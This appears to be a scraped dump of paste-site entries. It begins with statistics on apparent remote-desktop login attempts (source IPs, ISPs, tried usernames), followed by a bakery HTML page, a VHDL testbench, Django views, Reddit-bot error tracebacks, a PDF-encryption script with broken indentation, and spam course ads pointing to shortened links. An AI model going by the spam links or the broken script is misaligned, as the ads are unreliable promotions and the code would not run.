    ""172.104.208.93"": 1,
    ""194.165.16.10"": 2,
    ""64.23.189.251"": 2,
    ""45.227.254.48"": 2,
    ""205.210.31.110"": 3,
    ""62.204.41.107"": 6,
    ""162.142.125.216"": 1,
    ""179.60.147.129"": 1,
    ""78.24.205.142"": 1,
    ""167.94.145.55"": 1,
    ""205.210.31.72"": 3,
    ""87.251.75.145"": 2,
    ""185.170.144.3"": 1,
    ""58.218.204.183"": 3,
    ""137.27.236.90"": 1,
    ""36.91.222.100"": 2,
    ""123.56.20.194"": 2,
    ""118.193.36.56"": 1,
    ""45.227.254.8"": 4,
    ""198.235.24.64"": 3,
    ""45.135.232.19"": 1,
    ""120.240.145.8"": 1,
    ""27.184.195.229"": 1,
    ""194.169.175.21"": 1,
    ""87.251.75.64"": 1,
    ""143.110.172.155"": 2,
    ""216.24.210.142"": 1,
    ""213.109.202.232"": 3,
    ""198.235.24.155"": 3
  },
  ""asn"": {
    ""AS14061"": 8,
    ""AS63949"": 1,
    ""AS48721"": 2,
    ""AS267784"": 6,
    ""AS396982"": 12,
    ""AS59425"": 6,
    ""AS398324"": 1,
    ""AS209588"": 1,
    ""AS400810"": 1,
    ""AS398705"": 1,
    ""AS208091"": 3,
    ""AS197414"": 1,
    ""AS4134"": 4,
    ""AS20115"": 1,
    ""AS7713"": 2,
    ""AS37963"": 2,
    ""AS135377"": 1,
    ""AS198953"": 1,
    ""AS56040"": 1,
    ""AS209605"": 1,
    ""AS62240"": 1,
    ""AS208312"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 8,
    ""Akamai Technologies"": 1,
    ""Flyservers S.A."": 9,
    ""Google LLC"": 12,
    ""Horizon LLC"": 6,
    ""Censys, Inc."": 2,
    ""BreezeHost"": 1,
    ""Xhost Internet Solutions LP"": 4,
    ""Chinanet"": 4,
    ""Charter Communications"": 1,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Proton66 OOO"": 1,
    ""China Mobile communications corporation"": 1,
    ""UAB Host Baltic"": 1,
    ""Clouvider Limited"": 1,
    ""Red Byte LLC"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 8,
    ""Linode"": 1,
    ""Flyservers S.A"": 2,
    ""UAB Host Baltic"": 6,
    ""Palo Alto Networks, Inc"": 12,
    ""Horizon LLC"": 6,
    ""Censys Inc"": 1,
    ""Cloud Solutions S.A"": 1,
    ""Abr Tose'eh Darya Group Company PJSC"": 1,
    ""Censys, Inc."": 1,
    ""Xhost Internet Solutions"": 3,
    ""Xhostis"": 1,
    ""Chinanet JS"": 3,
    ""Spectrum"": 1,
    ""Telekomunikasi Indonesia"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Proton66 LLC"": 1,
    ""China Mobile"": 1,
    ""Chinanet HE"": 1,
    ""EmanuelHosting LTD"": 1,
    ""IPXO"": 1,
    ""Chang Way Technologies Co. Limited"": 3
  },
  ""regionName"": {
    ""New Jersey"": 5,
    ""Kaunas"": 3,
    ""California"": 16,
    ""Vilnius"": 6,
    ""Moscow"": 10,
    ""Michigan"": 1,
    ""Distrito Federal"": 1,
    ""Texas"": 1,
    ""Hesse"": 1,
    ""North Holland"": 4,
    ""Jiangsu"": 3,
    ""Jakarta"": 2,
    ""Beijing"": 2,
    ""Kowloon"": 1,
    ""Guangdong"": 1,
    ""Hebei"": 1,
    ""England"": 2
  },
  ""country"": {
    ""United States"": 23,
    ""Lithuania"": 9,
    ""Russia"": 10,
    ""Venezuela"": 1,
    ""Germany"": 1,
    ""The Netherlands"": 4,
    ""China"": 7,
    ""Indonesia"": 2,
    ""Hong Kong"": 1,
    ""United Kingdom"": 2
  },
  ""account"": {
    ""x7bupyia"": 4,
    ""beio"": 1,
    ""Test"": 12,
    ""hello"": 11,
    ""gmBXMTwAH"": 1,
    ""XVFGVA"": 1,
    ""UfXLmz"": 1,
    ""(empty)"": 5,
    ""Administr"": 7,
    ""yGQokHzFL"": 1,
    ""ypNUTy"": 1,
    ""pnRaCk"": 1,
    ""Administrator"": 1,
    ""nGyQGpfHN"": 1,
    ""VXNnRe"": 1,
    ""FEGaDZ"": 1,
    ""Domain"": 7,
    ""rgzgSwLHx"": 1,
    ""pkGMCc"": 1,
    ""eIkKqG"": 1
  },
  ""keyboard"": {
    ""Unknown"": 60
  },
  ""client_build"": {
    ""Unknown"": 60
  },
  ""client_name"": {
    ""Unknown"": 60
  },
  ""ip_type"": {
    ""hosting"": 24,
    ""Unknown"": 34,
    ""mobile"": 1,
    ""mobile & hosting & proxy"": 1
  }
}"
5BewwX5i,Web_Designe_GPT.html,edefrutos,HTML,Friday 23rd of February 2024 05:43:31 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
<meta charset=""UTF-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1"">
<link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/@picocss/pico@1/css/pico.min.css"">
<title>Bakery Website</title>
</head>
<body>
<nav class=""container-fluid"">
<ul>
<li><strong>Bakery Delights</strong>
    </li>
    </ul>
    <ul>
        <li><a href=""#"">Home</a></li>
        <li><a href=""#"">About Us</a></li>
        <li><a href=""#"">Our Products</a></li>
        <li><a href=""#"" role=""button"">Contact Us</a></li>
    </ul>
    </nav>
    <main class=""container"">\n<div class=""grid"">
        <section>
            <hgroup>
                <h2>Welcome to Bakery Delights</h2>
                <h3>Your go-to spot for fresh, handmade pastries</h3>
            </hgroup>
            <p>We take pride in serving you the finest baked goods, made with love and the freshest ingredients. Step into our cozy bakery and let the aroma of freshly baked bread and pastries envelop you.</p>
            <figure>\n<img src=""https://source.unsplash.com/featured/?bakery"" alt=""Bakery showcase"" />
                <figcaption>Our Signature Pastries - <a href=""https://unsplash.com/s/photos/bakery"" target=""_blank"">Explore More</a>
                </figcaption>
            </figure>
            <h3>Our Story</h3>
            <p>Founded by a family of passionate bakers, Bakery Delights has been bringing joy to our local community with our delicious baked goods for over a decade. Our commitment to quality and freshness is what sets us apart.</p>
            <h3>Featured Products</h3>
            <p>From savory breads to sweet treats, we have something for everyone. Our selection of baked goods is constantly evolving, so be sure to check out our latest creations.</p>
        </section>
        </div>
    </main>
    <section aria-label=""Subscribe example"">
        <div class=""container"">
            <article>
                <hgroup>
                    <h2>Stay Updated</h2>
                    <h3>Subscribe to our newsletter</h3>
                </hgroup>
                <form class=""grid"">
                    <input type=""text"" id=""firstname"" name=""firstname"" placeholder=""Your Name"" aria-label=""Your Name"" required />
                    <input type=""email"" id=""email"" name=""email"" placeholder=""Your Email"" aria-label=""Your Email"" required />
                    <button type=""submit"" onclick=""event.preventDefault()"">Subscribe</button>
                </form>
            </article>
        </div>
    </section>
    <footer class=""container"">
        <small>
            <a href=""#"">Privacy Policy</a>
            <a href=""#"">Terms of Service</a>
        </small>
    </footer>
    </body>
</html>"
12V2aeuD,Untitled,sissou123,Python,Friday 23rd of February 2024 05:41:46 PM CDT,"Learn Python Programming - Beginner to Master
Become a Python Expert. for Both Academics and Industry. 100+ Challenges 
What you'll learn
Master Python Programming by doing 100+ Challenges
Detail understanding of fundamentals
Build Multithreaded Applications
using Python for Database Programming 
for more :https://cuty.io/1lRLp0leIX
"
gFXGiWHz,Untitled,sissou123,Python,Friday 23rd of February 2024 05:37:50 PM CDT,"100 Days of Code: The Complete Python Pro Bootcamp
Master Python by building 100 projects in 100 days. Learn data science, automation, build websites, games and apps! 
What you'll learn
You will master the Python programming language by building 100 unique projects over 100 days.
You will learn automation, game, app and web development, data science and machine learning all using Python. 
for more:https://cuty.io/gtzUOaJOV9s
"
PXimLhkE,Untitled,sissou123,HTML,Friday 23rd of February 2024 05:22:46 PM CDT,"50+ Web Projects with HTML, CSS, and JavaScript in 2024
HTML, CSS, and JavaScript. Build 50+ Web Projects with HTML, CSS, and JavaScript  
What you'll learn
50+ Web Projects with pure HTML, CSS, and JavaScript
Modern Techniques and Tricks
Modern HTML5, CSS3, and JavaScript Features 
for more:https://cuty.io/HPoS9Gmq2g
"
Ub2rHXMe,gol_dec_tb,rustyelectron,VHDL,Friday 23rd of February 2024 05:20:02 PM CDT,"----------------------------------------------------------------------------------
-- Company: 
-- Engineer: 
-- 
-- Create Date: 23.02.2024 22:08:25
-- Design Name: 
-- Module Name: gol_dec_tb - rtl
-- Project Name: 
-- Target Devices: 
-- Tool Versions: 
-- Description: 
-- 
-- Dependencies: 
-- 
-- Revision:
-- Revision 0.01 - File Created
-- Additional Comments:
-- 
----------------------------------------------------------------------------------


library IEEE;
use IEEE.STD_LOGIC_1164.ALL;

entity gol_dec_tb is
--  Port ( );
end gol_dec_tb;

architecture rtl of gol_dec_tb is
    -- Declare the component under test
    component gol_dec is
        port (
            codeword_i : in  std_logic_vector(5 downto  0);
            symbol_o   : out std_logic_vector(3 downto  0)
        );
    end component gol_dec;

    -- Declare signals for the testbench
    signal tb_codeword_i : std_logic_vector(5 downto  0);
    signal tb_symbol_o   : std_logic_vector(3 downto  0);

begin
    -- Instantiate the component under test
    dut: gol_dec
        port map (
            codeword_i => tb_codeword_i,
            symbol_o   => tb_symbol_o
        );

    -- Testbench stimulus process
    stim_proc: process
    begin
        -- Initialize inputs
        tb_codeword_i <= ""100000"";
        wait for  10 ns;

        tb_codeword_i <= ""001000"";
        wait for  10 ns;

        tb_codeword_i <= ""000110"";
        wait for  10 ns;
        
        tb_codeword_i <= ""001100"";
        wait for  10 ns;
        
        tb_codeword_i <= ""111000"";
        wait for  10 ns;
        
        tb_codeword_i <= ""010100"";
        wait for  10 ns;
        -- End the simulation
        wait;
    end process stim_proc;    
end rtl;
"
qPZYiwEm,PasswordProtectPDF.py,edefrutos,Python,Friday 23rd of February 2024 04:54:34 PM CDT,"from PyPDF2 import PdfFileWriter, PdfFileReader
import getpass
pdfwriter=PdfFileWriter()
pdf=PdfFileReader (""1.pdf"")
for page_num in range(pdf. numPages) :
pdfwriter .addPage(pdf.getPage(page_num))
passw=getpass.getpass(prompt='Enter Password: ' )
pdfwriter.encrypt(passw)
with
open ( 'ho. pdf', 'wb' )
as f:
pdfwriter.write(f)"
gmcdBJVX,Untitled,sissou123,JavaScript,Friday 23rd of February 2024 04:54:15 PM CDT,"20 Web Projects With Vanilla JavaScript
Build 20 mini frontend projects from scratch with HTML5, CSS & JavaScript (No frameworks or libraries) 
What you'll learn
Build 20 Frontend Projects From Scratch
No JS or CSS Frameworks
Modern JavaScript (ES6+) - Arrows, Fetch, Promises, etc 
for more:https://cuty.io/oO9cU
"
b48grBmY,Details and Delete Profile,horozov86,Python,Friday 23rd of February 2024 04:21:41 PM CDT,"class DetailProfileView(views.DetailView):
    queryset = Profile.objects.all()
    template_name = 'profiles/profile-details.html'

    def get_object(self, queryset=None):
        return get_profile()


class DeleteProfileView(views.DeleteView):
    queryset = Profile.objects.all()
    template_name = 'profiles/profile-delete.html'

    def get_object(self, queryset=None):
        return get_profile()"
jTudSEZz,ServerError: received 500 HTTP response,Vault-TecTradingCo,Python,Friday 23rd of February 2024 04:18:38 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/main.py"", line 57, in wrapper
    job_func(*args, **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/main.py"", line 91, in comment_listener
    database_manager.load_comment(comment, db_conn)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/database_manager.py"", line 163, in load_comment
    process_command_non_mod_user(comment, db_conn)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/database_manager.py"", line 141, in process_command_non_mod_user
    bot_responses.karma_rewarded_comment(comment)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/bot_responses.py"", line 42, in karma_rewarded_comment
    reply(comment, comment_body)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/bot_responses.py"", line 20, in reply
    new_comment.mod.distinguish(how=""yes"")
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/models/reddit/mixins/__init__.py"", line 104, in distinguish
    self.thing._reddit.post(API_PATH[""distinguish""], data=data)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 842, in post
    return self._objectify_request(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 517, in _objectify_request
    self.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 941, in request
    return self._core.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 330, in request
    return self._request_with_retries(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 253, in _request_with_retries
    return self._do_retry(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 162, in _do_retry
    return self._request_with_retries(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 253, in _request_with_retries
    return self._do_retry(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 162, in _do_retry
    return self._request_with_retries(
  File ""/root/Bots/Fallout76MarketplaceKarmaBot/venv/lib/python3.10/site-packages/prawcore/sessions.py"", line 266, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status_code](response)
prawcore.exceptions.ServerError: received 500 HTTP response
"
fjC7AfL6,TooManyRequests: received 429 HTTP response,Vault-TecTradingCo,Python,Friday 23rd of February 2024 04:10:01 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/main.py"", line 258, in main
    for comment in comment_stream:
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/util.py"", line 138, in stream_generator
    for item in reversed(list(function(limit=limit, **function_kwargs))):
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 63, in __next__
    self._next_batch()
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = self._reddit.get(self.url, params=self.params)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 712, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 517, in _objectify_request
    self.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 941, in request
    return self._core.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/src/prawcore/prawcore/sessions.py"", line 325, in request
    return self._request_with_retries(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/src/prawcore/prawcore/sessions.py"", line 264, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status_code](response)
prawcore.exceptions.TooManyRequests: received 429 HTTP response
"
